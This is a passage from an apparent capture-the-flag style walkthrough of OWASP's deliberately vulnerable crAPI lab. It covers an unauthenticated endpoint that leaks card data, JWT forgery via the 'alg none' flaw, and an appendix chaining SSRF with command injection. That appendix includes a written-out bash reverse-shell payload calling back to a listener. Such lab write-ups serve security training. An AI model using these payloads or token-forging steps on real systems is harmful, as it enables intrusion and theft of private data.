![Untitled35](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d7260032-5db0-4e56-9afb-6a846e50fdd8)

Again, the server replies with code 500; however, we can verify the coupon can be redeemed again as we did in the previous injection.

## UNAUTHENTICATED ACCESS
### Challenge 14. Find an endpoint that does not perform authentication checks for a user
Enumerate the application to find the endpoint that does not perform authentication. This is `/workshop/api/shop/orders/1` where, in fact, the application is disclosing critical information such as credit card details and private data without user authentication.

![Untitled39](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8ff57d5d-eeba-4d94-bb85-22c20e6e83cb)

## JWT VULNERABILITIES
### Challenge 15. Find a way to forge valid JWT tokens
Intercept the traffic during the login process and capture a token.\
\
The captured token is the following.
```bash
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDU4NzQ1OTgsImV4cCI6MTcwNjQ3OTM5OH0.NZGJYnmy9KQNj8O1ZpHTzobLuXIxalOuDg883Ru6lcLDCwuTh8yJIIZXhdycZCixTytsT64q2dWbtuBKo2Ijw6Z8cNSh8hTXz6sGMZjmAZtiag2UE12nZN4ozQVovcdzyfXQ1exaGkOWrEvrz3GOh0zYJ0cJ0ZdJ4xCabR1kNMXLTvJy-kHQQ61e9smsgJaQvrQ4wWj5aSoCC3uKliJJ6tJjO-Cg_CcO7IfD07wkGEPt-wsS4tnDKnYJ1KMiT8TSCL2ibbJOIBvnhKu_cA5xneEGSSOGC-pi810eLf01aspi_PUdH6EBWd9sQHL4wkflOADeggnjGisVp2oG_Qhe1Q
```
You can inspect it at https://jwt.io or with `jwt_tool`, which also scans the token for vulnerabilities.
```bash
jwt_tool -t http://10.1.1.11:8005/identity/api/v2/user/dashboard -rh 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDYwMjQ5NDAsImV4cCI6MTcwNjYyOTc0MH0.BKfcT1TZyEJ8wVxStjuNMJ15IiRrRX6QcHl9MOeShDwtb3fa-JluycH3fTUYAb58-q1fAenp0b78wJ7DjYePtoro1_YF3aoQ7sZfCbvdxtzx8qwnpjLlpyIeISfGuMSVCT9ugMu42WPDHVfeNrUvTiINgvtUK2IzsesY4L5AUgEqjSjioEAmlac1HjtM9eSMBRanhjjTY-t--GlAdpKOB9eHyf4_6RqkkLliny30FvpVHrqiGfozgF8gGCMOBnL1138SRAMTGqZKndnNdLBLofQvlOAWzG_5kmBb8IGRe55WwRy6f81EKNxxuZdG9WglhNwWraHkxVtJaNW3piPtzg' -M at
```
The tool reports a vulnerability called `"alg" : "none"`, which means crAPI  is actually not checking the signature of the JWT tokens. Therefore, we can forge our own JWTs to login, the application will not check its signature at all.\
\
To forge the JWT we need to install the "JWT editor" extension in Burpsuite. Once the extension is installed, capture a login attempt and send to repeater. Then click on the "JWT editor" tab to modify the token as you want. The crAPI application will just accept it as is, since no signature is checked.\
\
For example, we will create a token for the admin user. If you remember from the SQLi chapter, we have admin login email admin@example.com. Add the email in the token "Payload" section, and  click on "Attack" -> "None signing algorithm", finally, click on "Send". The token will be used to successfully get authorization and the application will send a response containing the admin data.

![Untitled41](https://github.com/g1vi/AllTheWriteUps/assets/120142960/433e3f10-fef4-4342-a4d7-2db8010ffa61)

## APPENDIX. EXTRA MILE (REVERSE SHELL)
From challenges 5 and 10 we know the application assigns uploaded videos a property containing details to be used when the videos are compressed and shared with the community. If you notice, the conversion parameters look like arguments for a binary executable. Therefore, since we can manipulate this parameter, it could be an entry point for command injection.\
\
Following the same procedure as in challenge 10 we insert a reverse shell command in the `conversion_params` parameter.
```bash
-v code h265 && bash -i >& /dev/tcp/10.1.1.22/1919 0>&1
```

![Untitled42](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8e379d93-83d1-4081-8222-e551c87466d2)

Now we have to find a way to trigger the video conversion. This is done by clicking on "Share video with community", in the user dashboard video section. However, if we inspect the HTTP response when we start the conversion, a message appears.

> "Thi-S endpoint S-hould be accessed only inte-Rnally. -Fine? , endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video"

![Untitled43](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a04fe5f8-fcd8-49e5-bb1c-f98cbb65bc5c)

This definitely points to SSRF. If we review our notes, we exploited SSRF in challenge 11 by abusing the contact mechanic endpoint. So let's open another mechanic case, intercept the capture and add a call to the internal endpoint. Do not forget to add the video ID.
```bash
http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id=37
```

![Untitled44](https://github.com/g1vi/AllTheWriteUps/assets/120142960/207975b2-9e8c-46dc-a04e-60bef44c57a1)

Add the internal endpoint, start a listener on port 1919, send the request and... BOOM, a reverse shell is receive... Oh, wait! another message appears.

![Untitled45](https://github.com/g1vi/AllTheWriteUps/assets/120142960/63020d6b-e896-4d69-916e-cd8177f6c444)

This is a base64 encoded message, let's decode it.
```bash
> echo 'V09XLiBMb29rIGF0IHlvdS4gQ29tYmluaW5nIE1hc3MgQXNzaWdubWVudCBhbmQgU1NSRiB0byBleHBsb2l0IGEgaGlkZGVuIFNoZWxsIEluamVjdGlvbi4KV2UncmUgdmVyeSBwcm91ZC4gWW91IHdvbiB0aGUgZ2FtZS4gVW5mb3J0dW5hdGVseSwgd2UgZG9uJ3QgYWN0dWFsbHkgIAphbGxvdyBvdXIgcGVudGVzdGVyIHRvIHJ1biBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMgb24gb3VyIGJhY2tlbmQgOiggCkl0IGNvdWxkIGJlIHZlcnkgZXhwZW5zaXZlIGFuZCBhbm5veWluZyB0byBtYWludGFpbiBpdC4gCkFueWhvdywgaWYgeW91IGhvc3QgeW91ciBvd24gaW5zdGFuY2Ugb2YgY3JBUEksIHlvdSBjYW4gc2ltcGx5IGNoYW5nZSB0aGUKYGJsb2NrX3NoZWxsX2luamVjdGlvbnNgIGZsYWcgaW4gdGhlIGNvbmZpZyBmaWxlIHRvIGFsbG93IHJlYWwgc2hlbGwgaW5qZWN0aW9ucy4=' | base64 -d

WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection. We're very proud. You won the game. Unfortunately, we don't actually allow our pentester to run arbitrary shell commands on our backend :(. It could be very expensive and annoying to maintain it. Anyhow, if you host your own instance of crAPI, you can simply change the `block_shell_injections` flag in the config file to allow real shell injections.
```
It seems they disabled command injections to avoid people abusing SSRF and command injection in the web-based crAPI interface, which sounds quite understable. However, we are hosting our own version of crAPI so it seems this is not yet over for us.\
\
I found several occurrencs of this `ENABLE_SHELL_INJECTION` flags in the source code. The following is a table containing all the flags I had to modify.

| path | flag |
|------|------|
|_deploy/docker/docker-compose.yml_|`ENABLE_SHELL_INJECTION=${ENABLE_SHELL_INJECTION:-true}`|
|_deploy/k8s/base/identity/config.yaml_|`ENABLE_SHELL_INJECTION = "true"`|
|_deploy/docker/.env_|`ENABLE_SHELL_INJECTION=true`|
|_services/identity/.env_|`export ENABLE_SHELL_INJECTION=true`|

After editing these, just restart crAPI and trigger again the conversion process. This time the API replies with a status code 200 and it does not contain the message, meaning the conversion process has successfully started with the command injected.

![Untitled46](https://github.com/g1vi/AllTheWriteUps/assets/120142960/dd351586-8506-420a-b570-63c1972864cc)

## WRAPPING UP
We succesfully meet the 15 challenges proposed by OWASP and found and documented top ten API vulnerabilities in the crAPI application. Furthermore, we found a way to inject commands which potentially could lead to a reverse shell in the host.

If you have read everything and have come this far, I send you my appreciation and congratulations, and I look forward to reading your comments.
